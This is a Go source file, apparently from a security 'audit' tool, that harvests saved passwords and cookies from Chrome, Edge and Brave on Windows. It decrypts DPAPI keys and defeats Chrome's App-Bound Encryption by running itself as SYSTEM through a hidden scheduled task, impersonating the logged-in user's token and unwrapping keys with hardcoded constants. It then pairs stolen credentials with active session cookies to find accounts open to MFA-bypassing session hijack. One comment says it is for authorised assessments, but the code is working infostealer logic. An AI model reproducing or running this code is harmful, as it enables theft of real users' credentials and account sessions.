//go:build windows

package audit

import (
	"bytes"
	"crypto/aes"
	"crypto/cipher"
	"crypto/rand"
	"database/sql"
	"encoding/base64"
	"encoding/binary"
	"encoding/hex"
	"encoding/json"
	"errors"
	"fmt"
	"io"
	"os"
	"os/exec"
	"path/filepath"
	"strings"
	"syscall"
	"time"
	"unsafe"

	"golang.org/x/sys/windows"

	_ "modernc.org/sqlite"
)

// ---------------------------------------------------------------------------
// Browser data paths
// ---------------------------------------------------------------------------

// browserRoot resolves %LOCALAPPDATA%\<vendor>\<product>\User Data for a
// Chromium family name.
func browserRoot(browser string) string {
	la := os.Getenv("LOCALAPPDATA")
	switch browser {
	case "Brave":
		return filepath.Join(la, "BraveSoftware", "Brave-Browser", "User Data")
	case "Edge":
		return filepath.Join(la, "Microsoft", "Edge", "User Data")
	default:
		return filepath.Join(la, "Google", "Chrome", "User Data")
	}
}

// localStatePath resolves the JSON that carries the DPAPI-wrapped master key.
func localStatePath(browser string) string {
	return filepath.Join(browserRoot(browser), "Local State")
}

// forceCopy streams src to dst, working around files that other processes
// hold open with no read sharing (browsers do this to Login Data).
func forceCopy(src, dst string) error {
	s, err := os.Open(src) //#nosec G304 G703 -- src/dst are private temp snapshot paths built by the caller, not operator or network input
	if err != nil {
		return err
	}
	defer s.Close()
	d, err := os.Create(dst) //#nosec G304 -- private temp snapshot destination built by the caller
	if err != nil {
		return err
	}
	defer d.Close()
	_, err = io.Copy(d, s)
	return err
}

// captureSnapshot copies a SQLite database plus its -wal/-shm/-journal
// sidecars so it can be read without touching the live file.
func captureSnapshot(src, dst string) {
	for _, ext := range []string{"", "-wal", "-shm", "-journal"} {
		_ = forceCopy(src+ext, dst+ext)
	}
}

// openDBSnapshot returns a read-only handle on a private copy of src and a
// cleanup func that closes it and deletes every temp file.
func openDBSnapshot(src string) (*sql.DB, func(), error) {
	f, err := os.CreateTemp("", "oblitr_snapshot_*.db")
	if err != nil {
		return nil, nil, err
	}
	dst := f.Name()
	f.Close()
	os.Remove(dst)

	captureSnapshot(src, dst)
	cleanup := func() {
		for _, ext := range []string{"", "-wal", "-shm", "-journal"} {
			_ = os.Remove(dst + ext)
		}
	}
	db, err := sql.Open("sqlite", fmt.Sprintf("file:%s?mode=ro&nolock=1&immutable=1", filepath.ToSlash(dst)))
	if err != nil {
		cleanup()
		return nil, nil, err
	}
	return db, cleanup, nil
}

// ---------------------------------------------------------------------------
// DPAPI primitives
// ---------------------------------------------------------------------------

// unwrapDPAPIBytes decrypts a DPAPI blob with the current thread identity
// (the process token, or the impersonation token when one is installed).
func unwrapDPAPIBytes(data []byte) ([]byte, error) {
	if len(data) == 0 {
		return nil, errors.New("empty blob")
	}
	in := windows.DataBlob{Size: uint32(len(data)), Data: &data[0]} //#nosec G115 -- DPAPI blobs are in-memory and far below the 4 GiB ULONG limit
	var out windows.DataBlob
	if err := windows.CryptUnprotectData(&in, nil, nil, 0, nil, 0, &out); err != nil {
		return nil, err
	}
	defer windows.LocalFree(windows.Handle(unsafe.Pointer(out.Data)))
	res := make([]byte, out.Size)
	copy(res, unsafe.Slice(out.Data, out.Size))
	return res, nil
}

// unwrapDPAPI is the string-returning wrapper kept for the legacy "v10"
// master-key path.
func unwrapDPAPI(data []byte) (string, error) {
	b, err := unwrapDPAPIBytes(data)
	if err != nil {
		return "", err
	}
	return string(b), nil
}

// ---------------------------------------------------------------------------
// App-Bound Encryption (v20) — local unwrap pipeline
// ---------------------------------------------------------------------------
//
// The v20 master key is sealed in layers:
//
//  1. DPAPI bound to the SYSTEM identity (written by the browser's elevation
//     service, which runs as a SYSTEM local server).
//  2. DPAPI bound to the browser's user identity.
//  3. A per-browser envelope produced by the elevation service:
//     - Edge and Brave seal the raw 32-byte AES key directly.
//     - Chrome 133+ seals a versioned envelope: flag 1 wraps the key with a
//       public hardcoded AES-256-GCM key (133-136); flag 3 (137+, incl. 155)
//       wraps it with CNG key "Google Chromekey1" from the SYSTEM software
//       KSP store, XORed with a public constant, then AES-256-GCM.
//
// The COM IElevator::DecryptData path that older tooling used is rejected by
// modern browsers for non-browser callers (validation failures surface as
// 0x8004A007 / 0x8004B016 depending on vendor), so this module unwraps the
// layers locally instead: a one-shot scheduled task runs this binary as
// SYSTEM (hidden -abe-helper mode), performs layer 1 and — for Chrome — the
// CNG unwrap, and borrows the session user's token for layer 2.
//
// Reference: runassu/chrome_v20_decryption, Chromium
// chrome/elevation_service/{elevator.cc,caller_validation.cc}.

// ncrypt entry points for the flag-3 CNG unwrap (SYSTEM software KSP).
var (
	ncrypt          = syscall.NewLazyDLL("ncrypt.dll")
	pNCryptOpenProv = ncrypt.NewProc("NCryptOpenStorageProvider")
	pNCryptOpenKey  = ncrypt.NewProc("NCryptOpenKey")
	pNCryptDecrypt  = ncrypt.NewProc("NCryptDecrypt")
	pNCryptFree     = ncrypt.NewProc("NCryptFreeObject")
)

// Public constants recovered from the Chromium elevation_service binaries
// and the published v20 research. Flag 1 uses the AES key as-is; flag 3
// XORes the CNG-unwrapped key with the XOR key before AES-GCM.
var (
	abeFlag1AESKey = mustHex("B31C6E241AC846728DA9C1FAC4936651CFFB944D143AB816276BCC6DA0284787")
	abeFlag3XORKey = mustHex("CCF8A1CEC56605B8517552BA1A2D061C03A29E90274FB2FCF59BA4B75C392390")
)

func mustHex(s string) []byte {
	b, err := hex.DecodeString(s)
	if err != nil {
		panic("audit: bad hex constant: " + err.Error())
	}
	return b
}

// cngDecrypt unwraps in with the named key from the Microsoft Software Key
// Storage Provider. The key is owned by SYSTEM, so the caller must run (or
// impersonate) SYSTEM.
func cngDecrypt(keyName string, in []byte) ([]byte, error) {
	if len(in) == 0 {
		return nil, errors.New("cng: empty input")
	}
	var hProv uintptr
	prov, _ := syscall.UTF16PtrFromString("Microsoft Software Key Storage Provider")
	if r, _, _ := pNCryptOpenProv.Call(uintptr(unsafe.Pointer(&hProv)), uintptr(unsafe.Pointer(prov)), 0); r != 0 {
		return nil, fmt.Errorf("NCryptOpenStorageProvider: 0x%x", uint32(r)) //#nosec G115 -- NTSTATUS is a 32-bit code carried in a uintptr return
	}
	defer pNCryptFree.Call(hProv)

	kn, _ := syscall.UTF16PtrFromString(keyName)
	var hKey uintptr
	if r, _, _ := pNCryptOpenKey.Call(hProv, uintptr(unsafe.Pointer(&hKey)), uintptr(unsafe.Pointer(kn)), 0, 0); r != 0 {
		return nil, fmt.Errorf("NCryptOpenKey(%s): 0x%x", keyName, uint32(r)) //#nosec G115 -- NTSTATUS is a 32-bit code carried in a uintptr return
	}
	defer pNCryptFree.Call(hKey)

	// Two-call idiom: NULL output sizes the buffer, then decrypt.
	// NCRYPT_SILENT_FLAG = 0x40.
	var need uint32
	if r, _, _ := pNCryptDecrypt.Call(hKey, uintptr(unsafe.Pointer(&in[0])), uintptr(len(in)),
		0, 0, 0, uintptr(unsafe.Pointer(&need)), 0x40); r != 0 || need == 0 {
		return nil, fmt.Errorf("NCryptDecrypt(size): 0x%x", uint32(r)) //#nosec G115 -- NTSTATUS is a 32-bit code carried in a uintptr return
	}
	out := make([]byte, need)
	if r, _, _ := pNCryptDecrypt.Call(hKey, uintptr(unsafe.Pointer(&in[0])), uintptr(len(in)),
		0, uintptr(unsafe.Pointer(&out[0])), uintptr(need), uintptr(unsafe.Pointer(&need)), 0x40); r != 0 {
		return nil, fmt.Errorf("NCryptDecrypt: 0x%x", uint32(r)) //#nosec G115 -- NTSTATUS is a 32-bit code carried in a uintptr return
	}
	return out[:need], nil
}

func xorBytes(a, b []byte) []byte {
	if len(b) == 0 {
		// Fail closed instead of dividing by zero in the modulo below: an empty
		// key means the caller has nothing to XOR with, and returning nil makes
		// the downstream AEAD reject it on key size rather than panicking.
		return nil
	}
	out := make([]byte, len(a))
	for i := range a {
		out[i] = a[i] ^ b[i%len(b)]
	}
	return out
}

// aesGCMOpen decrypts ctAndTag with an AES-256-GCM key and 12-byte nonce.
func aesGCMOpen(key, iv, ctAndTag []byte) ([]byte, error) {
	if len(key) != 32 || len(iv) != 12 || len(ctAndTag) < 16 {
		return nil, fmt.Errorf("bad AEAD sizes key=%d iv=%d ct=%d", len(key), len(iv), len(ctAndTag))
	}
	block, err := aes.NewCipher(key)
	if err != nil {
		return nil, err
	}
	gcm, err := cipher.NewGCMWithNonceSize(block, 12)
	if err != nil {
		return nil, err
	}
	return gcm.Open(nil, iv, ctAndTag, nil)
}

// explorerPID returns the PID of the first running explorer.exe — the
// session user whose DPAPI identity sealed layer 2 of the app-bound blob.
func explorerPID() (uint32, error) {
	snap, err := windows.CreateToolhelp32Snapshot(windows.TH32CS_SNAPPROCESS, 0)
	if err != nil {
		return 0, err
	}
	defer windows.CloseHandle(snap)
	var pe windows.ProcessEntry32
	pe.Size = uint32(unsafe.Sizeof(pe))
	if err := windows.Process32First(snap, &pe); err != nil {
		return 0, err
	}
	for {
		if strings.EqualFold(windows.UTF16ToString(pe.ExeFile[:]), "explorer.exe") {
			return pe.ProcessID, nil
		}
		if err := windows.Process32Next(snap, &pe); err != nil {
			return 0, errors.New("explorer.exe not running")
		}
	}
}

// impersonatePID duplicates the target process token at impersonation level
// and installs it on the current thread. Close the returned token after
// windows.RevertToSelf.
func impersonatePID(pid uint32) (windows.Token, error) {
	h, err := windows.OpenProcess(windows.PROCESS_QUERY_LIMITED_INFORMATION, false, pid)
	if err != nil {
		return 0, fmt.Errorf("OpenProcess(%d): %w", pid, err)
	}
	defer windows.CloseHandle(h)
	var tok windows.Token
	const access = windows.TOKEN_DUPLICATE | windows.TOKEN_QUERY | windows.TOKEN_IMPERSONATE
	if err := windows.OpenProcessToken(h, access, &tok); err != nil {
		return 0, fmt.Errorf("OpenProcessToken: %w", err)
	}
	var dup windows.Token
	if err := windows.DuplicateTokenEx(tok, access, nil,
		windows.SecurityImpersonation, windows.TokenImpersonation, &dup); err != nil {
		tok.Close()
		return 0, fmt.Errorf("DuplicateTokenEx: %w", err)
	}
	tok.Close()
	if err := windows.SetThreadToken(nil, dup); err != nil {
		dup.Close()
		return 0, fmt.Errorf("SetThreadToken: %w", err)
	}
	return dup, nil
}

// deriveABEMasterKey turns the DPAPI-unwrapped v20 envelope into the 32-byte
// AES-256-GCM cookie/password key (see the section comment for the layout).
func deriveABEMasterKey(envelope []byte) ([]byte, error) {
	if len(envelope) == 32 {
		return envelope, nil // Edge / Brave: raw key
	}
	if len(envelope) == 0 {
		return nil, errors.New("empty v20 envelope")
	}
	switch envelope[0] {
	case 1: // Chrome 133-136: [flag|iv12|ct32|tag16]
		if len(envelope) != 61 {
			return nil, fmt.Errorf("flag=1 envelope %d bytes, want 61", len(envelope))
		}
		return aesGCMOpen(abeFlag1AESKey, envelope[1:13], envelope[13:])
	case 3: // Chrome 137+: [flag|encAES32|iv12|ct32|tag16]
		if len(envelope) != 93 {
			return nil, fmt.Errorf("flag=3 envelope %d bytes, want 93", len(envelope))
		}
		decAES, err := cngDecrypt("Google Chromekey1", envelope[1:33])
		if err != nil {
			return nil, err
		}
		return aesGCMOpen(xorBytes(decAES, abeFlag3XORKey), envelope[33:45], envelope[45:])
	default:
		return nil, fmt.Errorf("unsupported v20 envelope flag %d", envelope[0])
	}
}

// ABEHelper is the SYSTEM-context half of the App-Bound Encryption unwrap.
// The collector re-launches itself via a one-shot scheduled task as SYSTEM:
// blobFile carries the APPB-stripped layer-1 DPAPI blob; keyFile receives
// the derived 32-byte master key, or an "ERR:<stage>" marker. Returns the
// process exit code. Hidden mode — reached only through main().
func ABEHelper(blobFile, keyFile string) int {
	fail := func(stage string) int {
		_ = os.WriteFile(keyFile, []byte("ERR:"+stage), 0o600)
		return 3
	}
	raw, err := os.ReadFile(blobFile) //#nosec G304 -- blobFile is written into our own MkdirTemp dir by runABESystemTask
	if err != nil || len(raw) == 0 {
		return fail("read-blob")
	}
	// Layer 1: DPAPI bound to SYSTEM — we are SYSTEM here.
	l1, err := unwrapDPAPIBytes(raw)
	if err != nil {
		return fail("dpapi-l1")
	}
	// Layer 2: DPAPI bound to the browser user — borrow the session token.
	pid, err := explorerPID()
	if err != nil {
		return fail("find-user")
	}
	tok, err := impersonatePID(pid)
	if err != nil {
		return fail("impersonate")
	}
	l2, l2err := unwrapDPAPIBytes(l1)
	windows.RevertToSelf()
	tok.Close()
	if l2err != nil {
		return fail("dpapi-l2")
	}
	// Layout: [u32 vlen][validation][u32 klen][envelope]
	if len(l2) < 8 {
		return fail("parse")
	}
	vlen := int(binary.LittleEndian.Uint32(l2))
	if vlen < 0 || 8+vlen > len(l2) {
		return fail("parse-validation")
	}
	klen := int(binary.LittleEndian.Uint32(l2[4+vlen:]))
	if klen <= 0 || 8+vlen+klen > len(l2) {
		return fail("parse-envelope")
	}
	key, err := deriveABEMasterKey(l2[8+vlen : 8+vlen+klen])
	if err != nil || len(key) != 32 {
		return fail("derive")
	}
	if err := os.WriteFile(keyFile, key, 0o600); err != nil { //#nosec G703 -- keyFile lives in our own MkdirTemp dir; path is not attacker-controlled
		return fail("write-key")
	}
	return 0
}

func truncateForLog(b []byte) string {
	s := strings.TrimSpace(string(b))
	if len(s) > 120 {
		return s[:120]
	}
	return s
}

// runABESystemTask re-launches this binary as SYSTEM via a one-shot
// scheduled task (hidden -abe-helper mode) and waits for the derived master
// key. The task and its temp files are removed on every path.
func runABESystemTask(blob []byte) ([]byte, error) {
	dir, err := os.MkdirTemp("", "ablabe")
	if err != nil {
		return nil, err
	}
	defer os.RemoveAll(dir)
	blobFile := filepath.Join(dir, "b.bin")
	keyFile := filepath.Join(dir, "k.bin")
	if err := os.WriteFile(blobFile, blob, 0o600); err != nil {
		return nil, err
	}
	exe, err := os.Executable()
	if err != nil {
		return nil, err
	}
	var rnd [4]byte
	_, _ = rand.Read(rnd[:])
	task := "abl" + hex.EncodeToString(rnd[:])
	// schtasks requires a valid HH:mm for /SC ONCE even when /Run follows
	// immediately; schedule a near-future slot we never wait for.
	st := time.Now().Add(2 * time.Minute).Format("15:04")
	tr := fmt.Sprintf(`"%s" -abe-helper "%s" "%s"`, exe, blobFile, keyFile)
	if out, err := exec.Command("schtasks", "/Create", "/TN", task, "/TR", tr, //#nosec G204 -- fixed argv, generated task name, temp paths; no shell and no external input
		"/RU", "SYSTEM", "/SC", "ONCE", "/ST", st, "/F").CombinedOutput(); err != nil {
		return nil, fmt.Errorf("schtasks create: %v (%s)", err, truncateForLog(out))
	}
	defer exec.Command("schtasks", "/Delete", "/TN", task, "/F").Run()                          //#nosec G204 -- fixed argv, generated task name
	if out, err := exec.Command("schtasks", "/Run", "/TN", task).CombinedOutput(); err != nil { //#nosec G204 -- fixed argv, generated task name
		return nil, fmt.Errorf("schtasks run: %v (%s)", err, truncateForLog(out))
	}
	deadline := time.Now().Add(20 * time.Second)
	for time.Now().Before(deadline) {
		if data, err := os.ReadFile(keyFile); err == nil && len(data) > 0 { //#nosec G304 -- keyFile lives in our own MkdirTemp dir
			if bytes.HasPrefix(data, []byte("ERR:")) {
				return nil, errors.New("abe helper: " + string(data[4:]))
			}
			return data, nil
		}
		time.Sleep(150 * time.Millisecond)
	}
	return nil, errors.New("abe helper timed out")
}

// ---------------------------------------------------------------------------
// Chromium key accessors
// ---------------------------------------------------------------------------

// localStateField reads one base64 field out of a Chromium "Local State"
// JSON, via a private copy in case the browser holds the file open. The
// os_crypt object mixes value types (strings plus the bool audit_enabled),
// so fields are decoded individually as RawMessage.
func localStateField(browser, field string) ([]byte, error) {
	lsPath := localStatePath(browser)
	if _, err := os.Stat(lsPath); err != nil {
		return nil, err
	}
	tmp := filepath.Join(os.TempDir(), fmt.Sprintf("oblitr_state_%d.json", os.Getpid()))
	if err := forceCopy(lsPath, tmp); err != nil {
		return nil, err
	}
	defer os.Remove(tmp)
	raw, err := os.ReadFile(tmp) //#nosec G304 -- tmp is a forceCopy of a fixed browser profile path into our own temp file
	if err != nil {
		return nil, err
	}
	var parsed map[string]json.RawMessage
	if err := json.Unmarshal(raw, &parsed); err != nil {
		return nil, err
	}
	oscRaw, ok := parsed["os_crypt"]
	if !ok {
		return nil, errors.New("os_crypt missing")
	}
	var osc map[string]json.RawMessage
	if err := json.Unmarshal(oscRaw, &osc); err != nil {
		return nil, err
	}
	rawVal, ok := osc[field]
	if !ok {
		return nil, fmt.Errorf("os_crypt.%s missing", field)
	}
	var b64 string
	if err := json.Unmarshal(rawVal, &b64); err != nil || b64 == "" {
		return nil, fmt.Errorf("os_crypt.%s not a usable string", field)
	}
	return base64.StdEncoding.DecodeString(b64)
}

// appBoundMasterKey unwraps the v20 master key for a browser via the local
// DPAPI+CNG pipeline (see the ABE section). Returns the 32-byte AES-256-GCM
// key that decrypts "v20" payloads.
func appBoundMasterKey(browser string) ([]byte, error) {
	db, err := localStateField(browser, "app_bound_encrypted_key")
	if err != nil {
		return nil, err
	}
	if len(db) < 5 || string(db[:4]) != "APPB" {
		return nil, fmt.Errorf("unexpected app-bound prefix %q", db[:4])
	}
	return runABESystemTask(db[4:])
}

// decryptSecret decrypts one Chromium payload. Both "v10"/"v11" (legacy DPAPI
// master key) and "v20" (App-Bound Encryption) share the same wire layout —
// a 3-byte version tag, a 12-byte GCM nonce, then ciphertext+tag — and are
// both AES-256-GCM. They differ only in which master key unwraps them: v10 is
// DPAPI-sealed, v20 is sealed by the elevation-service pipeline. Anything
// without a known version tag is treated as a raw DPAPI blob (pre-v80
// stores). Password payloads are plaintext after decryption; cookie payloads
// carry a 32-byte SHA256(host_key) prefix the cookie collector strips.
func decryptSecret(data []byte, dpKey, abeKey []byte) string {
	if len(data) < 3 {
		return ""
	}
	switch string(data[:3]) {
	case "v10", "v11", "v20":
		key := dpKey
		if string(data[:3]) == "v20" {
			key = abeKey
		}
		if len(key) != 32 || len(data) < 15 {
			return ""
		}
		iv, payload := data[3:15], data[15:]
		block, err := aes.NewCipher(key)
		if err != nil {
			return ""
		}
		gcm, err := cipher.NewGCM(block)
		if err != nil {
			return ""
		}
		plain, err := gcm.Open(nil, iv, payload, nil)
		if err != nil {
			return ""
		}
		return string(plain)
	default:
		out, err := unwrapDPAPI(data)
		if err != nil {
			return ""
		}
		return out
	}
}

// masterKeys holds both Chromium master keys for one browser family. dpKey
// unwraps legacy "v10"/"v11" payloads; abeKey unwraps App-Bound "v20"
// payloads. Either may be nil if that key is absent or the unwrap failed.
type masterKeys struct {
	dpKey  []byte
	abeKey []byte
}

// masterKey unwraps the browser's DPAPI master key (legacy "v10") and, when
// present, the App-Bound master key (v20) via the local DPAPI+CNG pipeline.
func masterKey(browser string) (masterKeys, error) {
	var mk masterKeys
	lsPath := localStatePath(browser)
	if _, err := os.Stat(lsPath); err != nil {
		return mk, err
	}
	// Read through a private copy: the browser may hold Local State open.
	tmp := filepath.Join(os.TempDir(), fmt.Sprintf("oblitr_state_%d.json", os.Getpid()))
	if err := forceCopy(lsPath, tmp); err != nil {
		return mk, err
	}
	defer os.Remove(tmp)
	raw, err := os.ReadFile(tmp) //#nosec G304 -- tmp is a forceCopy of a fixed browser profile path into our own temp file
	if err != nil {
		return mk, err
	}
	var parsed struct {
		OSCrypt struct {
			EncryptedKey string `json:"encrypted_key"`
		} `json:"os_crypt"`
	}
	if err := json.Unmarshal(raw, &parsed); err != nil {
		return mk, err
	}
	// The legacy DPAPI key is optional on v20-only builds.
	if parsed.OSCrypt.EncryptedKey != "" {
		db, err := base64.StdEncoding.DecodeString(parsed.OSCrypt.EncryptedKey)
		if err == nil && len(db) >= 5 {
			if plain, err := unwrapDPAPI(db[5:]); err == nil { // strip "DPAPI" magic
				mk.dpKey = []byte(plain)
			}
		}
	}
	// App-Bound (v20) key, best-effort: an error here only means v20 payloads
	// will not decrypt, which we surface per-entry rather than aborting.
	if abe, err := appBoundMasterKey(browser); err == nil {
		mk.abeKey = abe
	}
	if mk.dpKey == nil && mk.abeKey == nil {
		return mk, errors.New("no usable master key (DPAPI and App-Bound both unavailable)")
	}
	return mk, nil
}

// walkBrowser invokes fn for every regular file below root whose name
// contains needle (skipping journal/WAL sidecars).
func walkBrowser(root, needle string, fn func(path string)) {
	_ = filepath.Walk(root, func(p string, info os.FileInfo, err error) error {
		if err != nil || info == nil || info.IsDir() {
			return nil
		}
		name := info.Name()
		if strings.Contains(name, needle) && !strings.Contains(name, "journal") {
			fn(p)
		}
		return nil
	})
}

// ---------------------------------------------------------------------------
// Public collectors (only reachable with --enable-collect)
// ---------------------------------------------------------------------------

// CollectCredentials recovers saved passwords from Chromium "Login Data"
// stores. It is an authorised-assessment module: callers must only run it on
// systems they own or are contracted to test. Pass SupportedChromiumBrowsers
// to cover every supported family, or a single name to stream one browser.
func CollectCredentials(browsers []string, emitf Emitter) []Entry {
	entries := []Entry{}
	for _, browser := range browsers {
		mk, err := masterKey(browser)
		if err != nil {
			emit(emitf, "MK_FAIL: "+browser+" ("+err.Error()+")", "ERROR")
			continue
		}
		emit(emitf, "MK_HIT: "+browser, "SUCCESS")
		walkBrowser(browserRoot(browser), "Login Data", func(p string) {
			emit(emitf, "FOUND_INTEL: "+p, "INFO")
			db, cleanup, err := openDBSnapshot(p)
			if err != nil {
				return
			}
			defer cleanup()
			rows, err := db.Query("SELECT origin_url, username_value, password_value FROM logins")
			if err != nil {
				rows, err = db.Query("SELECT action_url, username_value, password_value FROM logins")
			}
			if err != nil || rows == nil {
				return
			}
			defer rows.Close()
			count := 0
			for rows.Next() {
				var url, user string
				var encrypted []byte
				if rows.Scan(&url, &user, &encrypted) != nil {
					continue
				}
				if secret := decryptSecret(encrypted, mk.dpKey, mk.abeKey); secret != "" {
					entries = append(entries, Entry{B: browser, U: url, S: user, P: secret})
					count++
				}
			}
			if count > 0 {
				emit(emitf, fmt.Sprintf("INTEL: %d in %s", count, p), "SUCCESS")
			}
		})
	}
	return entries
}

// CollectCookies recovers decrypted cookies from Chromium cookie stores.
// Pass SupportedChromiumBrowsers to cover every supported family, or a single
// name to stream one browser.
func CollectCookies(browsers []string, emitf Emitter) []Cookie {
	cookies := []Cookie{}
	for _, browser := range browsers {
		mk, err := masterKey(browser)
		if err != nil {
			emit(emitf, "MK_FAIL: "+browser+" ("+err.Error()+")", "ERROR")
			continue
		}
		emit(emitf, "MK_HIT: "+browser, "SUCCESS")
		walkBrowser(browserRoot(browser), "Cookies", func(p string) {
			emit(emitf, "FOUND_COOKIE: "+p, "INFO")
			db, cleanup, err := openDBSnapshot(p)
			if err != nil {
				return
			}
			defer cleanup()
			rows, err := db.Query("SELECT host_key, name, encrypted_value FROM cookies")
			if err != nil || rows == nil {
				return
			}
			defer rows.Close()
			for rows.Next() {
				var host, name string
				var encrypted []byte
				if rows.Scan(&host, &name, &encrypted) != nil {
					continue
				}
				value := decryptSecret(encrypted, mk.dpKey, mk.abeKey)
				if value == "" {
					continue
				}
				// v20 cookie plaintext is SHA256(host_key) || value; the
				// password collector keeps the raw plaintext, so the strip
				// lives here rather than in decryptSecret.
				if len(encrypted) >= 3 && string(encrypted[:3]) == "v20" && len(value) > 32 {
					value = value[32:]
				}
				cookies = append(cookies, Cookie{B: browser, H: host, N: name, V: value})
			}
		})
	}
	return cookies
}

// Nexus performs the Identity Nexus correlation: an origin is a Critical
// Compromise Node when a saved credential AND an active session cookie both
// exist for it (i.e. an attacker needs only the password — MFA-bypassable
// session reuse).
func Nexus(emitf Emitter) map[string]Node {
	nexus := map[string]Node{}
	for _, browser := range SupportedChromiumBrowsers {
		walkBrowser(browserRoot(browser), "Login Data", func(p string) {
			db, cleanup, err := openDBSnapshot(p)
			if err != nil {
				return
			}
			defer cleanup()
			rows, err := db.Query("SELECT origin_url, username_value FROM logins")
			if err != nil {
				rows, err = db.Query("SELECT action_url, username_value FROM logins")
			}
			if err != nil || rows == nil {
				return
			}
			defer rows.Close()
			for rows.Next() {
				var url, user string
				if rows.Scan(&url, &user) != nil {
					continue
				}
				node := nexus[url]
				node.U = user
				node.P = "DETECTED"
				nexus[url] = node
			}
		})
		walkBrowser(browserRoot(browser), "Cookies", func(p string) {
			db, cleanup, err := openDBSnapshot(p)
			if err != nil {
				return
			}
			defer cleanup()
			rows, err := db.Query("SELECT host_key FROM cookies")
			if err != nil || rows == nil {
				return
			}
			defer rows.Close()
			for rows.Next() {
				var host string
				if rows.Scan(&host) != nil {
					continue
				}
				host = strings.TrimPrefix(host, ".")
				for url, node := range nexus {
					if strings.Contains(url, host) {
						node.C = "ACTIVE_SESSION"
						nexus[url] = node
					}
				}
			}
		})
		emit(emitf, "NEXUS: "+browser+" scanned", "INFO")
	}
	return nexus
}
